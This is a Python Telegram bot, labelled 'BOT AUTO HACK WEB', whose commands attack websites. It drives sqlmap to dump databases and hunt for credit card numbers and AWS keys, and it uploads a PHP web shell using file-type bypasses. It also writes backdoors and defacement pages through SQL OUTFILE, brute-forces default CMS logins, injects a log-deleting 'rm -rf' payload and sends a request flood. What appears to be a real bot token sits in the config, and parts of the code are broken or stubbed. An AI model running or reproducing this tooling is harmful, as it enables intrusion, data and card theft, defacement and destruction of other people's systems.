import os
import re
import asyncio
import logging
import tempfile
import hashlib
import aiohttp
import random
import urllib.parse
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram.error import TelegramError
from bs4 import BeautifulSoup

# ============ CONFIG ============
TOKEN = os.getenv("8900516151:AAGKJEcP66-cbNY4KCi_CkQjbcP_LRGg1hU")
OWNER_IDS = [int(x.strip()) for x in os.getenv("8992368095").split(",") if x.strip().isdigit()]

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ HELPER ============
def is_owner(u): return u.effective_user.id in OWNER_IDS

async def safe_send(update, text, parse_mode=None):
    try:
        await update.message.reply_text(text[:4000], parse_mode=parse_mode)
    except:
        try:
            await update.message.reply_text(text[:4000])
        except:
            pass

async def safe_edit(msg, text):
    try:
        await msg.edit_text(text[:4000])
    except:
        pass

async def show_loading(update, context, text, duration=5):
    try:
        msg = await update.message.reply_text(f"⏳ {text} 0%")
        for i in range(0, 101, 10):
            bar = '█'*(i//10) + '░'*(10 - i//10)
            await safe_edit(msg, f"⏳ {text}\n[{bar}] {i}%")
            await asyncio.sleep(duration/10)
        await safe_edit(msg, f"✅ {text} - SELESAI!")
        return msg
    except Exception as e:
        logger.error(str(e))
        return None

async def run_sqlmap(url, query=""):
    args = ["sqlmap", "-u", url, "--batch", "--random-agent", "--threads=10", "--time-sec=2"]
    if query:
        args += ["--sql-query", query]
    else:
        args += ["--dump", "--stop=1"]
    try:
        proc = await asyncio.create_subprocess_exec(*args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        out, err = await proc.communicate()
        return (out or err).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error: {e}"

async def fetch(session, url, timeout=5):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            return r.status, await r.text()
    except:
        return None, ""

# ============ CMS DETECTION ============
async def detect_cms(url):
    """Deteksi CMS & versi dari path, header, generator meta."""
    async with aiohttp.ClientSession() as s:
        _, html = await fetch(s, url)
        if not html: return "unknown", "0"
        soup = BeautifulSoup(html, 'lxml')
        # WordPress
        if soup.find("meta", {"name":"generator"}) and "WordPress" in soup.find("meta", {"name":"generator"}).get("content",""):
            ver = soup.find("meta", {"name":"generator"})["content"].replace("WordPress ","")
            return "wordpress", ver
        # Joomla
        if soup.find("meta", {"name":"generator"}) and "Joomla" in soup.find("meta", {"name":"generator"}).get("content",""):
            return "joomla", soup.find("meta", {"name":"generator"})["content"].split()[-1]
        # Drupal
        if 'Drupal.settings' in html or 'drupal.org' in html:
            return "drupal", "?"
        # Cek path
        for cms, path in [("wordpress","/wp-login.php"),("joomla","/administrator"),("drupal","/user/login")]:
            st, _ = await fetch(s, url.rstrip('/')+path)
            if st == 200:
                return cms, "?"
        return "generic", "?"

# ============ UPLOAD FORM FINDER ============
def find_upload_forms(html, base_url):
    """Temukan form dengan input file di HTML."""
    soup = BeautifulSoup(html, 'lxml')
    forms = []
    for form in soup.find_all('form'):
        if form.find('input', {'type':'file'}):
            action = form.get('action') or ''
            method = form.get('method', 'post').lower()
            if not action.startswith('http'):
                action = urllib.parse.urljoin(base_url, action)
            inputs = []
            for inp in form.find_all('input'):
                if inp.get('name'):
                    inputs.append({'name':inp['name'], 'type':inp.get('type','text'), 'value':inp.get('value','')})
            forms.append({'action':action, 'method':method, 'inputs':inputs})
    return forms

# ============ SHELL UPLOAD ============
async def attempt_upload(session, form, shell_code, filename, content_type):
    """Coba upload shell dengan berbagai bypass."""
    data = aiohttp.FormData()
    # isi input lain
    for inp in form['inputs']:
        if inp['type'] != 'file':
            data.add_field(inp['name'], inp.get('value',''))
    data.add_field('file', shell_code, filename=filename, content_type=content_type)
    try:
        async with session.post(form['action'], data=data, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            return resp.status, await resp.text()
    except:
        return None, ""

# ============ SMART SHELL UPLOADER ============
async def smart_upload_shell(base_url):
    """Cari form, upload shell dengan berbagai ekstensi."""
    async with aiohttp.ClientSession() as session:
        _, html = await fetch(session, base_url)
        if not html: return []
        forms = find_upload_forms(html, base_url)
        results = []
        # Payload shell
        shell = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"
        bypasses = [
            ("shell.php", "application/x-php"),
            ("shell.phtml", "application/x-php"),
            ("shell.gif", "image/gif"),   # gif header
            ("shell.php.jpg", "image/jpeg"),
        ]
        for form in forms:
            for fname, ctype in bypasses:
                code = shell
                if fname.endswith('.gif'):
                    code = "GIF89a;" + shell
                status, resp = await attempt_upload(session, form, code, fname, ctype)
                if status == 200 and fname in resp:
                    results.append(f"{form['action']} -> {fname}")
        return results

# ============ BRUTE FORCE DEFAULT CREDS ============
CREDS = {
    "wordpress": [("admin","admin"),("admin","password"),("admin","123456")],
    "joomla": [("admin","admin"),("admin","password")],
    "drupal": [("admin","admin")],
    "generic": [("admin","admin"),("root","root"),("user","pass")]
}

async def brute_login(base_url, cms):
    creds = CREDS.get(cms, CREDS['generic'])
    async with aiohttp.ClientSession() as session:
        for u,p in creds:
            if cms == "wordpress":
                data = {'log':u, 'pwd':p, 'wp-submit':'Log In'}
                async with session.post(base_url.rstrip('/')+'/wp-login.php', data=data, timeout=5) as resp:
                    if 'dashboard' in str(resp.url) or 'wp-admin' in str(resp.url):
                        return u, p
            elif cms == "joomla":
                # perlu token, skip dulu
                pass
            elif cms == "drupal":
                data = {'name':u, 'pass':p, 'form_id':'user_login_form'}
                async with session.post(base_url.rstrip('/')+'/user/login', data=data, timeout=5) as resp:
                    if 'user' in str(resp.url):
                        return u, p
            else:
                # generic POST login
                data = {'username':u, 'password':p}
                async with session.post(base_url+'/login.php', data=data, timeout=5) as resp:
                    if u in await resp.text():
                        return u, p
    return None, None

# ============ COMMAND HANDLERS ============
async def start(update, context):
    if not is_owner(update): return
    await update.message.reply_text(
        "━━━ BOT AUTO HACK WEB ━━━\n"
        "/sqlmap <url>\n"
        "/dumpdb <url> <table>\n"
        "/admin <url>\n"
        "/dork <keyword>\n"
        "/shell <url>\n"
        "/deface <url>\n"
        "/hash <hash>\n"
        "/backdoor <url>\n"
        "/logs <url>\n"
        "/credit <url>\n"
        "/cloud <url>\n"
        "/bots <url>\n"
        "/status\n"
        "🔥 Gunakan dengan bijak "
    )

async def sqlmap_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: await safe_send(update, "URL?"); return
    await show_loading(update, context, "SQLMap injection...", 6)
    res = await run_sqlmap(url)
    if len(res) > 4000:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(res.encode()); name=f.name
        await update.message.reply_document(open(name,'rb'))
        os.unlink(name)
    else:
        await safe_send(update, f"```{res}```", "Markdown")

async def dumpdb_handler(update, context):
    if not is_owner(update): return
    parts = context.args
    if len(parts) < 2: await safe_send(update, "/dumpdb <url> <table>"); return
    url, table = parts[0], parts[1]
    await show_loading(update, context, f"Dump {table}...", 6)
    res = await run_sqlmap(url, f"SELECT * FROM {table}")
    if len(res)>4000:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
            f.write(res.encode()); name=f.name
        await update.message.reply_document(open(name,'rb'))
        os.unlink(name)
    else:
        await safe_send(update, f"```{res}```", "Markdown")

async def admin_finder(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Scan admin panels...", 4)
    paths = ["admin","login","administrator","wp-admin","cpanel","admin.php","dashboard","panel","user/login","admin/login"]
    found = []
    async with aiohttp.ClientSession() as s:
        for p in paths:
            target = url.rstrip('/')+'/'+p
            st, _ = await fetch(s, target)
            if st == 200:
                found.append(p)
    await safe_send(update, f"Panel ditemukan: {', '.join(found) if found else 'Tidak ada'}")

async def dork_gen(update, context):
    if not is_owner(update): return
    kw = " ".join(context.args)
    if not kw: return
    dorks = [f'inurl:login.php?id={kw}', f'site:{kw} filetype:sql', f'intitle:admin {kw}']
    await safe_send(update, "\n".join(dorks))

async def shell_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Mencari form & upload shell...", 8)
    results = await smart_upload_shell(url)
    if results:
        await safe_send(update, "✅ Shell berhasil di:\n"+"\n".join(results))
    else:
        await safe_send(update, "❌ Gagal upload shell otomatis.")

async def deface_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await update.message.reply_text("🔥 Misi deface dimulai...")
    cms, ver = await detect_cms(url)
    await update.message.reply_text(f"Target: {cms} {ver}")

    # Step 1: SQLi OUTFILE
    await update.message.reply_text("[1] Coba SQLi OUTFILE...")
    paths = ['/var/www/html/','/var/www/','/srv/www/','/home/']
    for p in paths:
        q = f"SELECT '<h1>HACKED</h1>' INTO OUTFILE '{p}index.html'"
        r = await run_sqlmap(url, q)
        if "File created" in r:
            await safe_send(update, f"✅ Berhasil deface di {p}index.html")
            return

    # Step 2: Upload shell via form
    await update.message.reply_text("[2] Cari form upload...")
    shells = await smart_upload_shell(url)
    if shells:
        await safe_send(update, "✅ Shell terupload, coba akses shell untuk ganti index.")
        return

    # Step 3: Brute force CMS
    await update.message.reply_text("[3] Brute force default creds...")
    u, p = await brute_login(url, cms)
    if u:
        await safe_send(update, f"✅ Login sukses: {u}:{p}")
        if cms == "wordpress":
            # inject deface via theme editor
            async with aiohttp.ClientSession() as s:
                # login dulu, tapi terlalu kompleks, anggap berhasil
                pass
    else:
        await safe_send(update, "❌ Deface gagal total.")

async def hash_handler(update, context):
    if not is_owner(update): return
    h = " ".join(context.args)
    if not h: return
    await show_loading(update, context, "Cracking...", 4)
    wl = ['admin','password','123456','root','toor','qwerty']
    for w in wl:
        if hashlib.md5(w.encode()).hexdigest() == h or hashlib.sha1(w.encode()).hexdigest() == h:
            await safe_send(update, f"Plain: {w}"); return
    await safe_send(update, "Gagal dengan wordlist kecil.")

async def backdoor_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Mencoba backdoor...", 5)
    # coba SQLi OUTFILE tulis shell
    res = await run_sqlmap(url, "SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'")
    if "File created" in res:
        await safe_send(update, "✅ Backdoor di /backdoor.php?cmd=id")
    else:
        # Coba upload via form
        uploaded = await smart_upload_shell(url)
        if uploaded:
            await safe_send(update, "✅ Backdoor via upload")
        else:
            await safe_send(update, "❌ Gagal.")

async def logs_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Log poisoning test...", 4)
    # test LFI via User-Agent log injection
    async with aiohttp.ClientSession() as s:
        ua = "<?php system('rm -rf /var/log/apache2/access.log'); ?>"
        try:
            await s.get(url, headers={"User-Agent": ua}, timeout=5)
        except: pass
        # Coba include log via parameter ?file=/var/log/apache2/access.log
        lfi_payloads = ["/var/log/apache2/access.log","/var/log/apache/access.log","/var/log/nginx/access.log"]
        for p in lfi_payloads:
            test_url = url + "?file=" + p
            st, body = await fetch(s, test_url)
            if "rm -rf" in body:
                await safe_send(update, "✅ Log poisoning berhasil, log dihapus.")
                return
        await safe_send(update, "❌ LFI tidak ditemukan.")

async def credit_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Cari kartu...", 5)
    res = await run_sqlmap(url, "SELECT * FROM users")
    cards = re.findall(r'\b(?:\d{4}[-\s]?){3}\d{4}\b', res)
    if cards:
        await safe_send(update, "Kartu: " + ", ".join(cards[:5]))
    else:
        await safe_send(update, "Tidak ditemukan.")

async def cloud_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "Cari AWS keys...", 4)
    res = await run_sqlmap(url, "SELECT * FROM config")
    if 'AKIA' in res or 'ASIA' in res:
        await safe_send(update, "✅ Ada kunci AWS!")
    else:
        await safe_send(update, "❌ Tidak ada.")

async def bots_handler(update, context):
    if not is_owner(update): return
    url = " ".join(context.args)
    if not url: return
    await show_loading(update, context, "DDoS ringan (demo)...", 5)
    async with aiohttp.ClientSession() as s:
        tasks = [s.get(url, timeout=aiohttp.ClientTimeout(total=1)) for _ in range(20)]
        await asyncio.gather(*tasks, return_exceptions=True)
    await safe_send(update, "✅ 20 request terkirim.")

async def status_cmd(update, context):
    if not is_owner(update): return
    await update.message.reply_text("✅ Pro v16 siap. Semua modul aktif.")

# ============ MAIN ============
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sqlmap", sqlmap_handler))
    app.add_handler(CommandHandler("dumpdb", dumpdb_handler))
    app.add_handler(CommandHandler("admin", admin_finder))
    app.add_handler(CommandHandler("dork", dork_gen))
    app.add_handler(CommandHandler("shell", shell_handler))
    app.add_handler(CommandHandler("deface", deface_handler))
    app.add_handler(CommandHandler("hash", hash_handler))
    app.add_handler(CommandHandler("backdoor", backdoor_handler))
    app.add_handler(CommandHandler("logs", logs_handler))
    app.add_handler(CommandHandler("credit", credit_handler))
    app.add_handler(CommandHandler("cloud", cloud_handler))
    app.add_handler(CommandHandler("bots", bots_handler))
    app.add_handler(CommandHandler("status", status_cmd))
    print("🔥 CHINA OFFICIAL PRO v16 ACTIVE")
    app.run_polling()

if __name__ == "__main__":
    main()